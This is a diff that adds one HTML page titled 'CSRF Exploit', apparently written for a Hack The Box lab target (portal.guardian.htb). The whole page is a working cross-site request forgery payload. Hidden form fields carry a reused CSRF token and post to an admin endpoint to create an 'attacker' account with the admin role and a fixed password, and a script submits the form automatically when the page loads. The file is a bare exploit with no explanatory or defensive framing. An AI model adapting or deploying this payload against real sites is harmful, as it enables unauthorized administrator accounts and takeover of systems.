@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+<h1>CSRF Exploit Test</h1>
+<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="P@ssw0rd123">
+    <input type="hidden" name="full_name" value="Attacker User">
+    <input type="hidden" name="email" value="attacker@example.com">
+    <input type="hidden" name="dob" value="1990-01-01">
+    <input type="hidden" name="address" value="123 Hackers Street">
+    <input type="hidden" name="user_role" value="admin">
+    <input type="hidden" name="csrf_token" value="1ef1a2cbbcecb5bb14f7de532f74af81">
+</form>
+<script>
+    document.getElementById('csrfForm').submit();
+</script>
+</body>
+</html>
